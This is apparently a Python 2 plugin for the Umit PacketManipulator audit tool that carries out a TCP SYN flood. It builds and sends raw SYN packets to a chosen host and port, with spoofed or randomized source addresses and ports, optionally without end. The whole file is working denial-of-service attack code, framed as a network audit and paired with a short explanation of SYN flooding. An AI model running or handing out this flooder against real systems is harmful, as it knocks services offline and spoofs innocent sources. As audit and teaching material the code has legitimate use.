#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Copyright (C) 2008,2010 Adriano Monteiro Marques
#
# Author: Francesco Piccinno <stack.box@gmail.com>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA

import gtk
import gobject

from time import sleep
from random import randint
from threading import Thread

from umit.pm.core.i18n import _
from umit.pm.core.logger import log
from umit.pm.core.atoms import generate_traceback
from umit.pm.core.auditutils import is_ip, random_ip, AuditOperation
from umit.pm.core.const import STATUS_ERR, STATUS_WARNING, STATUS_INFO

from umit.pm.gui.core.app import PMApp
from umit.pm.gui.plugins.core import Core
from umit.pm.gui.plugins.engine import Plugin
from umit.pm.manager.auditmanager import *

from umit.pm.backend import MetaPacket

AUDIT_NAME = 'tcp-synflood'
AUDIT_MSG = '<tt><b>' + AUDIT_NAME + ':</b> %s</tt>'

class SynFlood(Plugin, ActiveAudit):
    __inputs__ = (
        ('source', ('0.0.0.0', _('A spoofed IP source address or 0.0.0.0'
                                 'to use your IP'))),
        ('target', ('0.0.0.0', _('IP address or hostname of the target.'))),
        ('sport', (0, _('Source TCP port.'))),
        ('dport', (80, _('Destination TCP port'))),
        ('probes', (1, _('Number of packets to send. -1 for infinite'))),
        ('delay', (300, _('Delay in msec between sends'))),
        ('randomize source', (True, _('Randomize source IP address ' \
                                      'before each send'))),
        ('randomize sport', (True, _('Randomize source TCP port ' \
                                     'before each send'))),
    )

    def start(self, reader):
        a, self.item = self.add_menu_entry('SynFlood', 'SYN flooding ...',
                                           _('Start a SYN flooding attack against a target'),
                                           gtk.STOCK_EXECUTE)

    def stop(self):
        self.remove_menu_entry(self.item)

    def execute_audit(self, sess, inp_dict):
        source = inp_dict['source']
        target = inp_dict['target']

        sport = inp_dict['sport']
        dport = inp_dict['dport']

        randip = inp_dict['randomize source']
        randport = inp_dict['randomize sport']

        probes = inp_dict['probes']

        if probes < -1 or probes == 0:
            sess.output_page.user_msg(_('Probes could be -1 or > 1'),
                                      STATUS_ERR, AUDIT_NAME)
            return False

        if dport < 1 or dport > 65535:
            sess.output_page.user_msg(_('Dport is not a valid TCP port'),
                                      STATUS_ERR, AUDIT_NAME)
            return False

        if not randport and (sport < 1 or sport > 65535):
            sess.output_page.user_msg(_('Sport is not a valid TCP port'),
                                      STATUS_ERR, AUDIT_NAME)
            return False

        resolve = lambda x: is_ip(x) and x or gethostbyname(x)

        dip = resolve(target)

        if not randip:
            sip = resolve(source)

        if dip == '0.0.0.0':
            sess.output_page.user_msg(_('Target not valid'),
                                      STATUS_ERR, AUDIT_NAME)
            return False

        return SynFloodOperation(
            randip and randip or sip,
            dip,
            randport and randport or sport,
            dport,
            probes,
            max(inp_dict['delay'], 0),
            sess.context
        )

class SynFloodOperation(AuditOperation):
    has_stop = True
    has_start = True

    def __init__(self, sip, dip, sport, dport, probes, delay, context):
        """
        @param sip source IP or 0.0.0.0 or True for randomize
        @param dip dest IP
        @param sport source TCP port or True for randomize
        @param dport dest TCP port
        @param probes packets to send
        @param delay delay between 2 sends
        @param context the AuditContext
        """

        AuditOperation.__init__(self)

        self.sip = sip
        self.dip = dip
        self.sport = sport
        self.dport = dport
        self.probes = probes
        self.delay = delay and delay / 1000.0 or 0
        self.context = context

        self.internal = False

    def start(self):
        if self.internal:
            return False

        self.internal = True
        self.state = self.RUNNING

        thread = Thread(target=self.__thread_main, name='SYNFLOOD')
        thread.setDaemon(True)
        thread.start()

        self.summary = AUDIT_MSG % _('started against %s:%d ...' \
                       % (self.dip, self.dport))

        return True

    def stop(self):
        self.internal = False
        self.summary = AUDIT_MSG % _('stopping ...')

    def __thread_main(self):
        try:
            log.debug('Entered in __thread_main')

            packets = 0
            probes = self.probes

            while probes != 0 and self.internal:
                pkt = MetaPacket.new('ip') / MetaPacket.new('tcp')

                if self.sip is True:
                    sip = random_ip()
                elif self.sip != '0.0.0.0':
                    sip = self.sip

                if self.sport is True:
                    sport = randint(1, 65535)
                else:
                    sport = self.sport

                pkt.set_fields('ip', {
                    'dst' : self.dip,
                    'src' : sip})

                pkt.set_fields('tcp', {
                    'sport' : sport,
                    'dport' : self.dport,
                    'flags' : TH_SYN,
                    'seq' : randint(0, 2L**32-1)})

                self.context.si_l3(pkt)
                sleep(self.delay)

                probes -= 1
                packets += 1

                if self.probes > 0:
                    self.summary = AUDIT_MSG % _('%d of %d sent' \
                                   % (packets, self.probes))
                    self.percentage = (packets / float(self.probes)) * 100.0
                else:
                    self.summary = AUDIT_MSG % _('%d sent' % packets)
                    self.percentage = (self.percentage + 536870911) % \
                                      gobject.G_MAXINT

            if self.internal:
                self.summary = AUDIT_MSG % _('Finished with %d sent' % packets)
                self.internal = False
            else:
                self.summary = AUDIT_MSG % _('stopped')

            self.percentage = 100.0
            self.state = self.NOT_RUNNING

        except Exception, err:
            log.error(generate_traceback())

__plugins__ = [SynFlood]
__plugins_deps__ = []

__audit_type__ = 1
__protocols__ = (('tcp', None), )
__vulnerabilities__ = (('TCP SYN Flood', {
    'description' : 'A SYN flood is a form of denial-of-service attack in '
                    'which an attacker sends a succession of SYN requests to a '
                    'target\'s system.\n\n'
                    'When a client attempts to start a TCP connection to a '
                    'server, the client and server exchange a series of '
                    'messages which normally runs like this:\n\n'
                    '   1. The client requests a connection by sending a SYN '
                    '(synchronize) message to the server.\n'
                    '   2. The server acknowledges this request by sending '
                    'SYN-ACK back to the client.\n'
                    '   3. The client responds with an ACK, and the connection '
                    'is established.\n\n'
                    'This is called the TCP three-way handshake, and is the '
                    'foundation for every connection established using the '
                    'TCP protocol.',
    'references' : ((None, 'http://en.wikipedia.org/wiki/'
                            'Syn_flood'),)
    }),
)

